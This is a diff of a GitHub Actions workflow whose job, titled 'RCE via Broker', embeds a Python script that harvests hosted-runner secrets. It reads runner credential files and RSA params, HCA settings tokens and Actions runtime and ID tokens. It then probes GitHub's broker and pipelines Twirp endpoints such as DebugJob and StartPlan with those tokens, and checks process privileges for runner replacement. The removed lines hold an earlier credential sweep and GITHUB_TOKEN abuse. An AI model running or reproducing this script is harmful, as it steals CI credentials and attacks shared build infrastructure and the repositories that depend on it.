@@ -8,10 +8,10 @@ jobs:
   api-test:
     runs-on: ubuntu-latest
     steps:
-      - name: RCE Vector Exploration
+      - name: RCE via Broker
         run: |
           python3 << 'PYEOF'
-          import json, os, urllib.request, urllib.error, ssl, time, base64, glob, subprocess
+          import json, os, urllib.request, urllib.error, ssl, time, base64, glob
 
           ctx = ssl.create_default_context()
           with open("/opt/hca/.settings") as f:
@@ -19,182 +19,176 @@ jobs:
 
           auth_token = settings["authToken"]
           scheduler_url = settings["schedulerApiUrl"]
-          trace_url = settings["traceApiUrl"]
           
-          # PART 1: Extract runner agent credentials (the REAL prize)
+          # Read runner credentials
+          runner_dir = "/home/runner/actions-runner/cached/2.334.0"
+          
           print("="*60)
-          print("[1] RUNNER AGENT CREDENTIALS")
+          print("[1] RUNNER FILES")
           print("="*60)
           
-          # Find runner config files
-          runner_dirs = ["/home/runner", "/opt/runner", "/opt/hca", "/home/runner/runners"]
-          for d in runner_dirs:
-              if os.path.exists(d):
-                  for root, dirs, files in os.walk(d):
-                      for f in files:
-                          if f in ('.runner', '.credentials', '.credentials_rsaparams', 'appsettings.json', '.env', '.path'):
-                              fp = os.path.join(root, f)
-                              print(f"\n[+] Found: {fp}")
-                              try:
-                                  with open(fp) as fh:
-                                      content = fh.read()
-                                  print(f"    {content[:500]}")
-                              except:
-                                  pass
+          for fname in ['.runner', '.credentials', '.credentials_rsaparams']:
+              fp = os.path.join(runner_dir, fname)
+              if os.path.exists(fp):
+                  with open(fp) as f:
+                      content = f.read()
+                  print(f"\n--- {fname} ---")
+                  print(content[:1000])
+
+          # HCA settings credentials
+          print("\n\n--- HCA runnerAgentCredentials ---")
+          rc = settings.get("runnerAgentCredentials", "")
+          print(rc[:500])
           
-          # The runnerAgentCredentials from HCA settings
-          runner_creds_raw = settings.get("runnerAgentCredentials", "")
-          if runner_creds_raw:
-              print(f"\n[+] runnerAgentCredentials (first 200):")
-              print(f"    {runner_creds_raw[:200]}")
-              # Try to parse it
-              try:
-                  runner_creds = json.loads(runner_creds_raw)
-                  print(f"\n[+] Parsed runner credentials:")
-                  for k, v in runner_creds.items():
-                      val_str = json.dumps(v) if not isinstance(v, str) else v
-                      print(f"    {k}: {val_str[:150]}")
-              except:
-                  print("    (not JSON, trying base64)")
-                  try:
-                      decoded = base64.b64decode(runner_creds_raw)
-                      print(f"    base64 decoded: {decoded[:200]}")
-                  except:
-                      pass
-          
-          # RSA credentials
-          rsa_creds = settings.get("runnerAgentCredentialsRSA", "")
-          if rsa_creds:
-              print(f"\n[+] runnerAgentCredentialsRSA type: {type(rsa_creds)}")
-              if isinstance(rsa_creds, dict):
-                  for k, v in rsa_creds.items():
-                      print(f"    {k}: {str(v)[:100]}")
-              else:
-                  print(f"    value: {str(rsa_creds)[:300]}")
+          print("\n\n--- HCA runnerAgentCredentialsRSA ---")
+          rsa = settings.get("runnerAgentCredentialsRSA", "")
+          print(str(rsa)[:500])
 
           print("\n" + "="*60)
-          print("[2] RUNNER SERVICE CONFIGURATION")
+          print("[2] ACTIONS RUNTIME ENVIRONMENT")
           print("="*60)
           
-          # Find the runner's actual connection URL
-          runner_work = "/home/runner/work/_temp"
-          runner_agent = glob.glob("/home/runner/runners/*/") or []
-          runner_paths = ["/home/runner/runners", "/opt/actions-runner", "/runner"]
+          actions_url = os.environ.get("ACTIONS_RUNTIME_URL", "")
+          actions_token = os.environ.get("ACTIONS_RUNTIME_TOKEN", "")
+          actions_id_token_url = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL", "")
+          actions_id_token = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN", "")
           
-          for pattern in ["/home/runner/runners/*/.credentials", "/home/runner/runners/*/.runner", 
-                         "/opt/actions-runner/.credentials", "/opt/actions-runner/.runner"]:
-              for fp in glob.glob(pattern):
-                  print(f"\n[+] {fp}:")
-                  with open(fp) as fh:
-                      print(f"    {fh.read()[:500]}")
+          print(f"ACTIONS_RUNTIME_URL: {actions_url}")
+          print(f"ACTIONS_RUNTIME_TOKEN (50 chars): {actions_token[:50]}...")
+          print(f"ACTIONS_ID_TOKEN_REQUEST_URL: {actions_id_token_url}")
+          print(f"ACTIONS_ID_TOKEN_REQUEST_TOKEN (50): {actions_id_token[:50]}...")
           
-          # Find any .credentials_rsaparams
-          result = subprocess.run(["find", "/", "-name", ".credentials*", "-o", "-name", ".runner"], 
-                                capture_output=True, text=True, timeout=5)
-          print(f"\n[+] Credential files found:\n{result.stdout[:500]}")
-          
-          # Read the actual runner credentials
-          for cred_file in result.stdout.strip().split('\n'):
-              if cred_file and os.path.isfile(cred_file):
-                  try:
-                      with open(cred_file) as f:
-                          content = f.read()
-                      print(f"\n--- {cred_file} ---")
-                      print(content[:600])
-                  except:
-                      pass
+          # Also print GITHUB_* vars
+          for k, v in sorted(os.environ.items()):
+              if k.startswith(('GITHUB_', 'ACTIONS_', 'RUNNER_')):
+                  if 'TOKEN' not in k and 'SECRET' not in k:
+                      print(f"  {k}={v[:100]}")
           
           print("\n" + "="*60)
-          print("[3] TWIRP RUNSERVICE - DebugJob / StartPlan")
+          print("[3] BROKER API INTERACTION")
           print("="*60)
           
-          # The orchestrator base - try Twirp paths
-          twirp_base = scheduler_url.rsplit('/v1', 1)[0]
+          # The broker URL from .runner
+          broker_url = "https://broker.actions.githubusercontent.com"
           
-          headers = {
+          headers_hca = {
               "Authorization": f"Bearer {auth_token}",
               "Content-Type": "application/json",
               "User-Agent": "hosted-compute-agent/1.0"
           }
           
-          def api_call(method, url, body=None, extra_headers=None):
+          headers_actions = {
+              "Authorization": f"Bearer {actions_token}",
+              "Content-Type": "application/json",
+              "User-Agent": "GitHubActionsRunner/2.334.0"
+          }
+          
+          def api_call(method, url, body=None, hdrs=None):
               try:
-                  h = dict(headers)
-                  if extra_headers:
-                      h.update(extra_headers)
-                  data = json.dumps(body).encode() if body else (body if isinstance(body, bytes) else None)
+                  h = hdrs or headers_actions
+                  data = json.dumps(body).encode() if body and not isinstance(body, bytes) else body
                   req = urllib.request.Request(url, data=data, headers=h, method=method)
                   resp = urllib.request.urlopen(req, timeout=10, context=ctx)
-                  return resp.status, resp.read().decode()[:800]
+                  return resp.status, resp.read().decode()[:1000], dict(resp.headers)
               except urllib.error.HTTPError as e:
-                  body_resp = e.read().decode()[:800] if e.fp else ""
-                  return e.code, body_resp
+                  body_resp = e.read().decode()[:1000] if e.fp else ""
+                  return e.code, body_resp, dict(e.headers) if hasattr(e, 'headers') else {}
               except Exception as e:
-                  return 0, str(e)[:200]
+                  return 0, str(e)[:300], {}
 
-          # Try Twirp endpoints on orchestrator
+          # Try broker endpoints with Actions runtime token
+          print("\n[*] Testing broker with ACTIONS_RUNTIME_TOKEN:")
+          broker_paths = [
+              ("GET", "/health"),
+              ("GET", "/healthz"),
+              ("GET", "/_apis/v1/message"),
+              ("POST", "/_apis/v1/message"),
+              ("GET", "/_apis/distributedtask/pools"),
+              ("POST", "/twirp/github.actions.run_service.api.twirp.v1.RunService/DebugJob"),
+              ("POST", "/twirp/github.actions.run_service.api.twirp.v1.RunService/StartPlan"),
+          ]
+          
+          for method, path in broker_paths:
+              url = f"{broker_url}{path}"
+              body = {} if method == "POST" else None
+              status, resp, hdrs = api_call(method, url, body, headers_actions)
+              print(f"  {method} {path}: [{status}] {resp[:200]}")
+          
+          # Try with HCA auth token too
+          print("\n[*] Testing broker with HCA auth token:")
+          for method, path in [("GET", "/health"), ("POST", "/twirp/github.actions.run_service.api.twirp.v1.RunService/DebugJob")]:
+              url = f"{broker_url}{path}"
+              body = {} if method == "POST" else None
+              status, resp, hdrs = api_call(method, url, body, headers_hca)
+              print(f"  {method} {path}: [{status}] {resp[:200]}")
+
+          print("\n" + "="*60)
+          print("[4] ACTIONS_RUNTIME_URL API")
+          print("="*60)
+          
+          if actions_url:
+              # The runtime URL has APIs for the current job
+              runtime_paths = [
+                  ("GET", "_apis/pipelines/workflows"),
+                  ("GET", "_apis/v1/message"),
+                  ("POST", "_apis/v1/message"),
+                  ("GET", "_apis/distributedtask/pools"),
+                  ("POST", "twirp/github.actions.run_service.api.twirp.v1.RunService/DebugJob"),
+                  ("POST", "twirp/github.actions.run_service.api.twirp.v1.RunService/StartPlan"),
+                  ("GET", "_apis/pipelines/1/runs"),
+              ]
+              
+              for method, path in runtime_paths:
+                  url = f"{actions_url}{path}"
+                  body = {} if method == "POST" else None
+                  status, resp, hdrs = api_call(method, url, body, headers_actions)
+                  print(f"  {method} {path}: [{status}] {resp[:300]}")
+
+          print("\n" + "="*60)
+          print("[5] TWIRP ON PIPELINES.ACTIONS.GITHUBUSERCONTENT.COM")  
+          print("="*60)
+          
+          # The actual Actions API host
+          pipelines_url = "https://pipelines.actions.githubusercontent.com"
+          
+          # Get run ID from env
+          run_id = os.environ.get("GITHUB_RUN_ID", "")
+          
           twirp_paths = [
               "/twirp/github.actions.run_service.api.twirp.v1.RunService/DebugJob",
               "/twirp/github.actions.run_service.api.twirp.v1.RunService/StartPlan",
               "/twirp/github.actions.run_service.api.twirp.v1.RunService/CancelPlan",
-              "/v1/twirp/github.actions.run_service.api.twirp.v1.RunService/DebugJob",
+              "/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact",
+              "/twirp/github.actions.results.api.v1.CacheService/CreateCacheEntry",
           ]
           
           for path in twirp_paths:
-              url = f"{twirp_base}{path}"
-              print(f"\n  POST {path}:")
-              # Try with JSON
-              status, resp = api_call("POST", url, {})
-              print(f"    JSON: [{status}] {resp[:200]}")
-              # Try with protobuf content type
-              status, resp = api_call("POST", url, b'\x00', {"Content-Type": "application/protobuf"})
-              print(f"    Proto: [{status}] {resp[:200]}")
-
+              url = f"{pipelines_url}{path}"
+              # Try with runtime token
+              status, resp, _ = api_call("POST", url, {}, headers_actions)
+              print(f"  POST {path}: [{status}] {resp[:200]}")
+          
           print("\n" + "="*60)
-          print("[4] ACTIONS SERVICE URL FROM RUNNER")
+          print("[6] COMMAND EXECUTION VIA RUNNER REPLACEMENT")
           print("="*60)
           
-          # Look for the Actions service URL that runner connects to
-          env_vars = {k:v for k,v in os.environ.items() if 'ACTION' in k or 'RUNNER' in k or 'GITHUB' in k}
-          for k in sorted(env_vars):
-              if 'TOKEN' not in k and 'SECRET' not in k:
-                  print(f"  {k}={env_vars[k][:100]}")
+          # Check if we can replace the runner binary or inject into its process
+          import subprocess
+          result = subprocess.run(["ps", "aux"], capture_output=True, text=True)
+          runner_procs = [l for l in result.stdout.split('\n') if 'Runner' in l or 'runner' in l or 'hca' in l]
+          print("Runner processes:")
+          for p in runner_procs[:10]:
+              print(f"  {p}")
           
-          # ACTIONS_RUNTIME_URL is the key!
-          actions_url = os.environ.get("ACTIONS_RUNTIME_URL", "")
-          actions_token = os.environ.get("ACTIONS_RUNTIME_TOKEN", "")
+          # Check what user we are and if we can signal/ptrace
+          print(f"\nUID: {os.getuid()}, EUID: {os.geteuid()}")
+          result = subprocess.run(["id"], capture_output=True, text=True)
+          print(f"id: {result.stdout.strip()}")
           
-          if actions_url:
-              print(f"\n[+] ACTIONS_RUNTIME_URL: {actions_url}")
-              print(f"[+] ACTIONS_RUNTIME_TOKEN: {actions_token[:50]}...")
-              
-              # Try Twirp on the Actions service
-              for path in ["/twirp/github.actions.run_service.api.twirp.v1.RunService/DebugJob",
-                          "/_apis/distributedtask/pools",
-                          "/_apis/pipelines"]:
-                  url = f"{actions_url.rstrip('/')}{path}"
-                  print(f"\n  GET {url}:")
-                  status, resp = api_call("GET", url, extra_headers={"Authorization": f"Bearer {actions_token}"})
-                  print(f"    [{status}] {resp[:300]}")
-
-          print("\n" + "="*60)
-          print("[5] GITHUB_TOKEN ABUSE - List workflow runs, dispatch")
-          print("="*60)
+          # Check capabilities
+          result = subprocess.run(["cat", "/proc/self/status"], capture_output=True, text=True)
+          for line in result.stdout.split('\n'):
+              if 'Cap' in line:
+                  print(f"  {line}")
           
-          github_token = os.environ.get("GITHUB_TOKEN", "")
-          if github_token:
-              # Try to dispatch a workflow in another repo
-              gh_headers = {
-                  "Authorization": f"token {github_token}",
-                  "Accept": "application/vnd.github.v3+json"
-              }
-              # Check our permissions
-              req = urllib.request.Request("https://api.github.com/repos/janvarry3x/cme_uf_5", headers=gh_headers)
-              try:
-                  resp = urllib.request.urlopen(req, context=ctx)
-                  repo_info = json.loads(resp.read())
-                  print(f"  Repo permissions: {repo_info.get('permissions', {})}")
-              except Exception as e:
-                  print(f"  Repo check: {e}")
-
           PYEOF
